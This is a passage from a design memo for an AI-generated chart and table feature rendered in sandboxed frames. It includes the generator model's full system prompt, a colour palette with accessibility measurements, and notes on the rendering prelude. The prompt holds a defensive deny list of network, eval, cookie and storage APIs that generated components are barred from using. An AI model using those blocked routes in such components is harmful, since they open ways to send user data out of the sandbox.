| P10 | The relay's **browser matrix** for the parent-document `frame-src` navigation block: Chromium is verified (Chrome 155, round-2 S-R2-1) but WebKit and Gecko are not — S5's row records the gap rather than implying coverage | re-run the round-2 probe rig (a parent page + a sandboxed `data:` child at a second local port, beacons logged server-side) in WebKit and Gecko; record the pre-request block and the second-`load` behaviour per engine | U-a/U-b |

---

## 10. Footprint statement

**Model-facing: zero.**
- No tool, no tool parameter, no system-prompt text, no context row.
- The design prompt lives only in the fork's isolated request (R7).
- The tools array and cached prefix are byte-identical to today (AGENTS.md "The tool-surface
  footprint ladder": no rung is used).

**Schema:**
- one custom entry type (`supplement_v1`);
- one additive event (`supplement_progress`);
- five additive runtime ops (`supplement_cancel/steer/restart/dismiss`, `supplements_for`);
- two desktop routes, three relay routes;
- one capability string (two halves: the owner-record list + the viewer's auth-frame boolean;
  §2.7) plus one `features` key;
- one settings section (10 keys), one env kill switch, one ledger purpose
  (`supplement_render`).

**Unchanged:**
- `DisplayHistoryWindow`, `AttachmentContent`, the move/sync code, the classification
  vendor contract, and Radient.

**Per-turn cost on a non-eligible or pre-filtered turn:** one provenance check plus a
bounded scan of the run's messages (target ≤ 5 ms, measured in C1's evidence). No I/O beyond
`stat`. No request.

---

## 11. Open questions — genuinely the operator's call

| # | Question | Recommendation |
|---|---|---|
| Q1 | **Default-on for graphics, and the per-job cap.** Files are free; graphics cost ≈ $0.04-0.08 per generated job at Sonnet-class (estimate, §5.3), and only on eligible turns that pass the decision. | `supplements.enabled=true`, `files=true`, **`graphics=true` once a renderer ships** (§6), `maxCostUsd=0.20` (2 × the per-job envelope high end + $0.04 headroom; R3, units per R2-6 — the cap is only checked between turns). Add a daily cap only if the dogfood week shows > $1/day. |
| Q2 | **Which model "auto" prefers** when several design-capable models are logged in (the ladder order in §2.5). | Sonnet-class first: the best measured HTML/SVG quality per dollar in prior design work. Revisit with the §5.3 arms. |
| Q3 | **The user-facing name.** | "Highlights" (§0). The alternative is "Supporting graphics" if the files half should stay unnamed. |
| Q4 | **Should answering a queued ask make the follow-up answer eligible?** The answer is the operator's input, but it replies to the agent's question. | No in v1 (precision). Revisit if the dogfood week shows missed charts after ask answers. |
| Q5 | **Featuring files on code-edit turns** (the diff is already visible). | No (§5.2 note); F4 adds an opt-in. |
| Q6 | **Mesh sessions in v1**: show peer files and components as "on <peer>", preview disabled, or hide them? | Show them, disabled, with the peer named; F2 adds transfer. |

Everything else in this memo is decided; a reviewer who disagrees should name the section.

---

## Appendix A — the generator prompt (the fork's system prompt, and only there)

This doubles as the fork's design guidelines. Measured: **972 tokens (o200k_base), 968
(cl100k_base), 3,919 chars**, with tiktoken 0.14 on this exact text. It is held verbatim in
`supplements/prompt.py` as `GENERATOR_SYSTEM_PROMPT`, and a unit test pins its token count
within ±5 %.

```text
You make supporting graphics for an answer the user has already read. Output 0-3 components, or NONE. NONE is the right answer whenever a graphic would not make the answer faster to understand than the text already does.

INPUT: <evidence> holds the user's request, the final answer, and data blocks (id, title, source, columns, rows) extracted from tool output and files. It is the ONLY source of numbers. An <instruction> from the user may follow; obey it within these rules.

HONESTY (hard rules)
- Plot only values present in <evidence>. Never invent, interpolate, extrapolate, forecast, round past the source's precision, or fill gaps. Missing value = gap, labelled. The helpers print each number at its own precision; an explicit `digits` is the only way to show fewer decimals.
- Put every plotted value in the component's <data> JSON, copied from evidence; scripts read data only via LO.data / LO.col.
- Each component has source="…": which evidence block(s) it shows, in plain words.
- If the evidence cannot support a graphic, output NONE.

PICK THE FORM
- Compare categories: bar (horizontal when labels are long or >6 bars). Change over time: line. Part of whole with ≤5 parts: stacked bar, never pie/donut. Distribution: histogram-style bar. Exact lookup, >12 rows or mixed units: table. Flow/steps: simple ordered list or small SVG diagram.
- One idea per component. Lead with the answer's main point in a short title (sentence case, no trailing period); pass it as `title` — the helper prints it visibly. Keep category labels ≤ 12 characters (this is a guide for the writing, not a render rule: the helper thins labels by width and truncates one only when its slot cannot hold it, keeping the full text in the tooltip).
- Axis/columns name the quantity AND unit ("Latency (ms)"). Start bar axes at zero. Sort bars by value unless order is meaningful.
- ≤6 series. Colour never carries meaning alone: label series directly or use LO.line's dash patterns and the legend.
- Dense data → table with right-aligned tabular numerals (LO.table does this).

LOOK
- The host injects the stylesheet and theme; do not set colours, fonts or backgrounds except via var(--lo-*) and LO.color(i). Background stays transparent; no borders, cards or shadows around the component; use spacing and var(--lo-hairline) rules.
- Body text 13px; captions 12px var(--lo-ink-muted); axis text 12px. Must work from the 220px canvas-open column to 900px wide: no fixed widths, use viewBox SVG (LO helpers redraw on width changes).
- Pass `title` and `unit`: the helper prints both visibly (a title line; the unit on the top axis tick). An unlabelled chart is a rendering bug.
- Keep height content-sized, under ~480px; split rather than scroll.
- No animation, transitions, or external fonts. Values stay readable without hover — tooltips are enhancement only (relay/native have no hover). **Accepted loss (round-2 D2-4):** where a label is still truncated on a no-hover surface, the full text is unreachable there — the axis titles and the data's own precision carry the meaning, and the fixture set (App. C) shows the worst case rather than assuming it away.

TECHNICAL CONTRACT
- No network, no storage, no navigation: never use fetch, XMLHttpRequest, WebSocket, import(), eval, Function, <form>, <iframe>, <object>, <embed>, <base>, <link>, <meta>, external src/href, javascript: URLs, window.open, localStorage, cookies. They are blocked and the component is discarded.
- Helpers (prefer them; they size, label and theme correctly):
  LO.table(target, dataId, {columns?, digits?})
  LO.bar(target, dataId, {x, y, horizontal?, unit?, caption?, values?})   y may be a list of columns
  LO.line(target, dataId, {x, y, unit?, zero?, caption?})
  LO.el(tag, attrs, ...children)  (attrs.svg=1 for SVG nodes) · LO.fmt(n, {unit, digits, compact}) · LO.color(i) · LO.onTheme(fn) · LO.onSize(fn)
- Write plain DOM/SVG code only if no helper fits; call LO.size() after changing layout.

OUTPUT FORMAT (exactly; nothing outside it)
<component title="…" source="…">
<data>{"<dataId>": {"title": "…", "columns": ["…"], "rows": [[…]]}}</data>
<html><div id="c"></div><script>LO.bar(document.getElementById("c"), "<dataId>", {x: "…", y: "…", unit: "…"})</script></html>
</component>
…or the single word NONE.
```

The turn-2 repair message is one line plus the validator errors:
`Fix only these components; keep the rest unchanged. Errors: <list>`.
A steer adds `<instruction>{user text, ≤ 500 chars}</instruction>` after the evidence.

## Appendix B — the series palette (prelude-owned)

| Slot | Light | Dark |
|---|---|---|
| `--s1` | `#0072B2` | `#56B4E9` |
| `--s2` | `#C24E00` | `#E69F00` |
| `--s3` | `#007A5A` | `#2EC4A0` |
| `--s4` | `#A8508A` | `#E89AC7` |
| `--s5` | `#6A4FC0` | `#F0E442` |
| `--s6` | `#3A3A3A` | `#D9D9D9` |

- Derived from Okabe-Ito. The light values were darkened until every slot cleared 3:1;
  the raw `#56B4E9`/`#E69F00` fail on 72/72 light backgrounds.
- **Measured** (scratch script parsing `themes.generated.css`):
  - against canvas/surface/elevated/message-surface of all **59** UI themes (18 light,
    41 dark) and all **31** relay themes, the minimum non-text contrast (WCAG 1.4.11) is
    **3.29:1** light (`#C24E00` on kanagawaLotus canvas) and **4.08:1** dark (`#56B4E9`
    on everforest elevated);
  - native's light (`#f2ede3`-family) and dark (`#22201c`-family) surfaces fall inside
    those ranges.
- **CVD** (Machado-style matrices, CIE76 ΔE between the closest pair):
  - light: normal 40.8, deutan 12.1, protan 16.2, tritan 10.9;
  - dark: normal 35.1, deutan 12.5, protan 14.7, tritan 9.7.
  - The weakest pairs are adjacent slots, which is why line series also get dash patterns
    and every series is labelled directly. Colour never carries meaning alone.
- The mode is chosen by the host's `mode` (from each theme's `color-scheme`), not by the
  theme id, so all 59 themes and live switches are covered by two palettes.
- **Palette scope (round-1 design D11, re-derived with the spike's script):**
  - including `sunken` as a ground puts light `--s2` at **2.92:1** (kanagawaLotus sunken),
    below the 3:1 floor → **`sunken` is not a supplement ground**; the block sits on the
    transcript's ground (canvas/surface family) and the host keeps it off `sunken`;
  - in v1 a supplement frame **does not share a rendered view** with the app's accent-drawn
    charts: the chart idiom (`chart-frame.tsx`, `fill-accent`/`stroke-accent`) is used in
    settings, the projects timeline, and the analytics panel, which presents as a dialog
    *over* the chat — none renders beside the transcript. Should a surface ever show both,
    **guard slot 1**: if ΔE76(accent, `--s1`) < 20, series 1 uses the farthest slot. The
    guard is measured at **+412 B gzip** with the size method §2.6 pins (the spike's
    `measure.py`, 2026-10-09 — the earlier "≈ +430 / +434" pair mixed two methods, D2-3), over the
    pinned prelude budget, so it is deliberately not in the v1 build — it lands with the
    surface that needs it, under the size test;
  - the adjacency measurement for the record: **25 of 59** UI themes have a slot within
    ΔE76 20 of their accent, **7 within 10** (worst vaporwave `--s4` 5.4, ayuDark `--s1`
    6.5, solarizedLight `--s1` 6.8).

## Appendix C — the vendored prelude (spike)

- A working spike of `prelude.css` + `prelude.js` — the **minified build** (sources as
  `prelude.src.*`, a `BUILD.md` with the rebuild command and the measurement method, plus
  `measure.py` which re-derives every size figure) — exists in the architect
  scratchpad and is attached to the C0 PR as the starting point; the round-1 remediation
  **and the round-2 label-layout fix** are folded in.
- **Size:** 2,044 B CSS + 8,180 B JS raw (minified build, esbuild 0.28.2); **4,538 B gzip** for
  both (`cat` the pair through `gzip -9` — one method for the budget, the guard's cost and every
  figure here). Budget: **≤ 11 KB raw / ≤ 4.5 KB gzip**, enforced by a unit test — 1,040 B and
  70 B spare; round 2 moved both caps because D2-1/D2-2/D2-4's fix cost +474 B gzip / +1,089 B
  raw against the pre-fix pair through the same tool (§2.6). Any addition re-measures and, at
  this margin, trims.
- It provides:
  - `LO.data` (frozen, from `<script type="application/json" id="lo-data">`);
  - `LO.ds/col/fmt/color/el/onTheme/onSize`;
  - `LO.table` (right-aligned tabular numerals, horizontal scroll at 320 px, title line,
    source-precision cells);
  - `LO.bar` (vertical/horizontal, grouped, zero baseline, direct value labels at source
    precision, category-label step-thinning, truncate-only-when-the-slot-requires-it with the
    full text in a `<title>`, unit on the top axis tick);
  - `LO.line` (numeric or categorical x, tick thinning by width, dash patterns per series,
    end labels, unit on the top tick);
  - **the axis-label rule (round-2 D2-1/D2-2/D2-4, in both helpers):** the left margin
    *reserves* the measured width of the widest left-anchored tick label — the top one carries
    the unit, so a fixed 48 px margin painted `150 req/s` as `50 req/s` — plus a 10 px gap to
    the plot; when that reservation would take more than 40 % of a narrow frame the top tick is
    drawn inside the plot above the top gridline instead, and never clipped. A category label
    is truncated only when its slot cannot hold it, and one that still cannot clear its drawn
    neighbour by 4 px is dropped, not overlapped. The horizontal bar's tick label is clamped
    into the plot and its right margin reserves the widest value label. The measuring helpers
    (`_tw`/`_fit`/`_cl`) stay closure-private; the documented surface on `LO` is unchanged;
  - `LO.size` (rAF-coalesced `resize` post) and the **width-change redraw**: a
    `ResizeObserver` on the root re-runs mounted helpers (rAF-coalesced) on a width change;
    raw components get `LO.onSize(fn)`; layout floor is the 220 px column (216 px inner),
    text never scales in supported surfaces;
  - the theme listener (source check, per-frame nonce echo, name whitelist
    `^--(lo|font)-[a-z0-9-]+$`, 120-char cap, **CSSOM application gated by `CSS.supports`**,
    `data-mode`, `color-scheme` follows the mode, hidden until the first theme or the 400 ms
    fallback as a last resort);
  - a window `error` → `{t:"error"}` post, and the **liveness answer**: `{t:"ping"}` →
    `{t:"pong"}` on the §4.1 wire (one outstanding at a time, never coalesced; round-2 S-R2-5).
- It makes no network calls, does no storage, and posts `parent` only through the one `P()`
  function.
- **Review points the C0 reviewer should check:**
  - the theme listener must run before component scripts (§2.6 assembly note);
  - `targetOrigin "*"` on `postMessage` is required, because the parent of an opaque frame
    cannot be named — and the receiving side does **not** rest on it: the parent validates
    `event.source`, the per-frame nonce (never carried in the URL), and drops messages from
    any frame whose navigation counter moved (round-1 S-R4);
  - the rendered fixture shows the title line and the unit (D2), the **unit-swap pair** on
    identical data (`req/s` → the top tick no longer clips; D2-1) and the six-long-category
    collision fixture at 300 and 220 px (D2-2) — labels truncated only where the slot requires
    it (D2-4) — plus source-precision values (D4) at 620 px;
    `isSecureContext`/`RTCPeerConnection` are
    recorded for whichever delivery P1 selects (round-1 S-R9);
  - the size test pins the **minified build** (the vendored pair); rebuild with
    `esbuild --minify` per the spike's `BUILD.md`.
